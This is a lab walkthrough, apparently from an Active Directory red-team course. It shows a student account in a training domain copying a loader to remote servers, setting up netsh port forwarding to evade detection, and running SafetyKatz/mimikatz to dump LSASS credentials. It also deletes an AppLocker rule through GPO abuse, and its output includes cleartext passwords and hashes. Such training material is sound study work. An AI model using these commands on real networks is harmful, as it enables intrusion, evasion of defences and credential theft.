![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

The new spawned process has `srvadmin` privileges.

`whoami`:
```
dcorp\student422
```

`hostname`:
```
dcorp-std422
```

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

Check if `srvadmin` has local admin privileges on any other machine.

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose`:
```
VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
dcorp-adminsrv
dcorp-mgmt🖥️
```

We have local admin access on the `dcorp-mgmt` server as `srvadmin` and we already know a session of `svcadmin` is present on that machine.

Let's use SafetyKatz to extract credentials from the machine. Run the below commands from the process running as `srvadmin`.

Copy the `Loader.exe` to `dcorp-mgmt`.

`echo Y | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe`:
```
Overwrite \\dcorp-mgmt\C$\Users\Public\Loader.exe (Yes/No/All)? Y
C:\AD\Tools\Loader.exe
1 File(s) copied
```

Using winrs, add the following port forwarding on `dcorp-mgmt` to avoid detection on `dcorp-mgmt`.

`$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22"`

Please note that we must use the `$null` variable to address output redirection issues.

Extract the credentials from LSASS process memory.

`winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 830583 (00000000:000cac77)
Session📌         : RemoteInteractive from 2📌
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/16/2025 8:42:36 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin👤
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa🔑
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

[SNIP]

Authentication Id : 0 ; 58588 (00000000:0000e4dc)
Session📌         : Service from 0📌
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/16/2025 7:43:40 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin👤
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : *ThisisBlasphemyThisisMadness!!🔑
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011🔑
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8

[SNIP]
```
🚩

- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) Disabling AppLocker by Modifying the GPO**

**Please note that modification to GPO is not OPSEC safe but still commonly abuse by threat actors.**

Recall that we enumerated that `student422` has Full Control/`GenericAll` on `Applocker` GPO (see *Learning Objective 02*).

Let's make changes to the GPO and disable Applocker on `dcorp-adminsrv`.

We need the Group Policy Management Console for this.
As the student VM is a Server 2022 machine, we can install it using the following steps: open Server Manager -> `Add roles and features` -> `Next` -> `Next` -> `Next` -> `Next` -> `Features` -> enable `Group Policy Management` -> `Next` -> `Install`.

![Install Group Policy Management Console](./assets/screenshots/learning_objective_07_install_gpmc.png)

After the installation is completed, start the gpmc.

We need to start a process as `student422` using runas, otherwise gpmc doesn't get the user context.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`runas /user:dcorp\student422 /netonly cmd`:
```
Enter the password for dcorp\student422:
Attempting to start cmd as user "dcorp\student422" ...
```

![New spawned terminal process 3](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_3.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`gpmc.msc`

In gpmc: expand `Forest: moneycorp.local` -> `Domains` -> `dollarcorp.moneycorp.local` -> `Applocked` -> right click on the `Applocker` policy and click on `Edit`.

![Group Policy Management Console - Disable Applocker GPO 1](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_1.png)

In the new window, expand `Policies` -> `Windows Settings` -> `Security Settings` -> `Application Control Policies` -> `Applocker`.

![Group Policy Management Console - Disable Applocker GPO 2](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_2.png)

Start looking at each category of the `Applocker` policies. You will find out that **there are two restrictions**. Recall that we have already enumerated this earlier.
- In the `Executable Rules`, 'Everyone' is allowed to run Microsoft signed binaries.
- In the `Script Rules`, 'Everyone' can run Microsoft signed scripts from any location and two default rules where 'Everyone' can run Microsoft signed scripts from `C:\Windows` and `C:\Program Files` folders.

As we already abused the default `Script Rules`, let's go for `Executable Rules`. Right click on the rule and delete it.

![Group Policy Management Console - Disable Applocker GPO 3](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_3.png)

Now, we can either wait for the GPO refresh or force an update on the `dcorp-adminsrv` machine. Let's go for the later using the following commands as `student422`.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`winrs -r:dcorp-adminsrv cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\student422>
```
🚀

![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)

`gpupdate /force`:
```
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

`exit`

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

Now, let's copy `Loader.exe` on the machine and use it to run SafetyKatz.

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe`:
```
Does \\dcorp-adminsrv\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:dcorp-adminsrv cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\student422>
```
🚀

![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys

[SNIP]

Authentication Id : 0 ; 136295 (00000000:00021467)
Session           : Service from 0
User Name         : appadmin👤
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/16/2025 7:43:13 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb🔑
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7

[SNIP]
```
🚩

Sweet! We were able to disable Applocker.

---
---
